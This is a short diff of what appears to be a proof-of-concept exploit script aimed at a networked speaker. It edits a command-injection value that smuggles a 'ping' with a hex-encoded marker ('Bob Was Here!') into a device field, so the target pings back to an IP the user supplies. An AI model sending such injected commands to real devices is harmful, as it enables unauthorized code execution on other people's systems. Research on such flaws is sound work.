@@ -13,7 +13,6 @@ SPEAKER_IP="$1"
 
 test -z "$2" && { echo "Second argument should be an IP address to ping, such as your own IP"; exit 1; }
 
-#COMMAND='"$(ping -p 426f6220576173204865726521 '$2' &)"'
 COMMAND='"$(ping -c 1 -p 426f6220576173204865726521 '$2' &)"'
 
 
